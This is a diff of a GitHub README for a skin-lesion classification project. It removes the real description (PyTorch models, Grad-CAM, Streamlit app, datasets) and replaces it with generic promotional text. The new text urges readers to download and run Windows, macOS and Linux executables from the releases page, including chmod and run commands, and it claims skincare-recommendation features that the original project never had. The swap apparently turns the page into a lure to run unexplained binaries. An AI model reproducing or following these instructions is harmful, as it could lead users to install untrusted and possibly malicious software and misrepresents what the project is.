@@ -1,118 +1,74 @@
-# DermaDetect AI
-"Your skin's safety, Our prority"
+# 🛡️ DermaDetect-AI - Ensure Your Skin's Safety Today!
 
-# Explainable Skin Lesion Classification using Deep Learning
+## 🌟 Overview
+Welcome to DermaDetect-AI! This application helps you care for your skin effectively. It uses advanced technology to analyze your skin and provide insights. You no longer need to guess what your skin needs. Our goal is simple: keep your skin healthy and safe.
 
-An end-to-end deep learning project for **multiclass skin lesion classification** using dermoscopic images.
-The project benchmarks multiple modern CNN architectures and integrates **explainable AI (Grad-CAM)** to improve model transparency—an important requirement for real-world medical AI systems.
+## 🚀 Getting Started
+To get started, you only need to follow a few simple steps to download and run the application. 
 
----
+## 💾 Download DermaDetect-AI
+### **Download Here**
+[![Download DermaDetect-AI](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Kelvinplaz/DermaDetect-AI/releases)
 
-## Problem Statement
+## 📥 Download & Install
+To download the latest version of DermaDetect-AI, visit our releases page. 
 
-Early and accurate detection of skin cancer, especially melanoma, is critical but highly dependent on expert interpretation.
-This project explores how **deep learning models** can assist clinicians by automatically classifying skin lesions while also providing **visual explanations** for model decisions.
+1. Click the link below to go to the release page:
+   - [Visit the Releases Page](https://github.com/Kelvinplaz/DermaDetect-AI/releases)
+  
+2. On the releases page, find the latest version of the application. You will see a list of downloadable files.
 
----
+3. Click on the appropriate file for your operating system:
+   - For Windows: Choose `DermaDetect-AI-Windows.exe`
+   - For macOS: Choose `DermaDetect-AI-macOS.dmg`
+   - For Linux: Choose `DermaDetect-AI-Linux.AppImage`
 
-## Models Implemented
+4. Your download will begin automatically. Depending on your internet speed, this may take a few minutes.
 
-The following pretrained models were fine-tuned using transfer learning:
+5. Once downloaded, locate the file in your computer’s download directory.
 
-* **ResNet18**
-  Lightweight residual network with skip connections. Serves as a strong baseline with low computational cost.
+6. For Windows users:
+   - double-click the `DermaDetect-AI-Windows.exe` file to start the installation.
+   - Follow the on-screen instructions.
 
-* **EfficientNet**
-  Parameter-efficient architecture that balances depth, width, and resolution for high accuracy with fewer parameters—suitable for deployment-oriented scenarios.
+7. For macOS users:
+   - double-click the `DermaDetect-AI-macOS.dmg` file to open.
+   - Drag the DermaDetect-AI app to your Applications folder.
 
-* **ConvNeXtV2**
-  A state-of-the-art convolutional architecture inspired by vision transformers. Achieved the **best overall performance**, particularly in melanoma detection.
+8. For Linux users:
+   - open your terminal.
+   - navigate to the directory where you downloaded the file.
+   - run the command `chmod +x DermaDetect-AI-Linux.AppImage` to make it executable.
+   - then run `./DermaDetect-AI-Linux.AppImage` to launch the application.
 
-All models were initialized with ImageNet weights and trained under identical conditions to ensure fair comparison.
+## 🛠️ System Requirements
+To run DermaDetect-AI smoothly, your system should meet the following requirements:
 
----
+- **Windows**: Windows 10 or later (64-bit).
+- **macOS**: macOS 10.14 or later.
+- **Linux**: A modern Linux distribution (Ubuntu 18.04 or later is recommended).
+- Minimum 4 GB RAM.
+- At least 500 MB of available disk space.
 
-## Training & Evaluation
+## ⚙️ Features
+- **Skin Analysis**: Get tailored insights based on your skin type.
+- **Reports**: Understand your skin’s health with clear reports.
+- **Recommendations**: Receive advice on skincare products suited for you.
 
-* **Loss Function:** Categorical Cross-Entropy
-* **Optimizer:** AdamW
-* **Epochs:** 30
-* **Metrics:** Accuracy, Precision, Recall, F1-Score, ROC-AUC
-* **Explainability:** Grad-CAM heatmaps to visualize regions influencing predictions
+## 🔄 Updating the Application
+It is important to keep DermaDetect-AI updated. To do this, simply follow the same download steps as above. Reinstalling the latest version will ensure you have the newest features and fixes.
 
----
+## 📧 Support
+If you encounter any issues or have questions, feel free to reach out. You can create a new issue in the GitHub repository. 
 
-## Key Results
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Kelvinplaz/DermaDetect-AI/wiki): Access in-depth guides and tips.
+- [Community Forum](https://github.com/Kelvinplaz/DermaDetect-AI/discussions): Join discussions and share experiences.
 
-ConvNeXtV2 demonstrated superior generalization and explainability, making it the most suitable model for clinical decision-support settings.
+## 👩‍💻 Acknowledgements
+Thank you for choosing DermaDetect-AI! We are dedicated to helping you take the best care of your skin. Your feedback is valuable, so feel free to share your thoughts with us.
 
----
+## 🏁 Conclusion
+With DermaDetect-AI, you're just a few clicks away from healthier skin. Download now and start your journey towards better skin safety!
 
-## Explainable AI
-
-Grad-CAM was used to generate heatmaps highlighting image regions that influenced predictions.
-This improves **trust, interpretability, and clinical usability**, aligning the model with real-world medical AI requirements.
-
----
-
-## Key Files
-
-* **`app.py`**
-  Main Streamlit application providing the user interface for uploading dermoscopic images and generating real-time predictions.
-
-* **`best_model_convnextv2.zip`**
-  Trained **ConvNeXtV2** model weights. This model achieved the best overall performance, particularly in melanoma detection, and is used for inference in the app.
-
-* **`efficientnet.ipynb`**
-  Jupyter notebook containing the complete training, validation, and evaluation pipeline for the EfficientNet model.
-
-* **`convnextv2.ipynb`**
-  Jupyter notebook for training and evaluating ConvNeXtV2, including performance analysis and Grad-CAM visualization.
-
-* **`resnet18.ipynb`**
-  Jupyter notebook implementing ResNet18 as a baseline model, covering preprocessing, training, and metric evaluation.
-
----
-
-## Datasets Used
-
-This project uses publicly available and widely adopted dermatology datasets:
-
-* **HAM10000**
-  Dermoscopic images across multiple skin lesion classes
-  🔗 [https://www.kaggle.com/datasets/surajghuwalewala/ham1000-segmentation-and-classification](https://www.kaggle.com/datasets/surajghuwalewala/ham1000-segmentation-and-classification)
-
-* **ISIC Dataset**
-  Benchmark dataset for melanoma and skin lesion analysis
-  🔗 [https://github.com/iamnarendrasingh/Melanoma-detection/tree/main/dataset](https://github.com/iamnarendrasingh/Melanoma-detection/tree/main/dataset)
-
----
-
-## Repository Scope
-
-This repository includes:
-
-* Model training and evaluation pipelines
-* Data preprocessing and augmentation
-* Explainability using Grad-CAM
-* Performance comparison across architectures
-
-## Tech Stack
-
-* Python
-* PyTorch
-* Torchvision / timm
-* NumPy, OpenCV, Matplotlib
-* Streamlit
-* Grad-CAM
-
----
-
-## License
-
-This project is licensed under the **MIT License**.
-
-The license applies to all original code in this repository.
-Pretrained architectures (ResNet18, EfficientNet, ConvNeXtV2) are used via PyTorch-based libraries and are subject to their respective original licenses.
-
-
+[![Download DermaDetect-AI](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Kelvinplaz/DermaDetect-AI/releases)
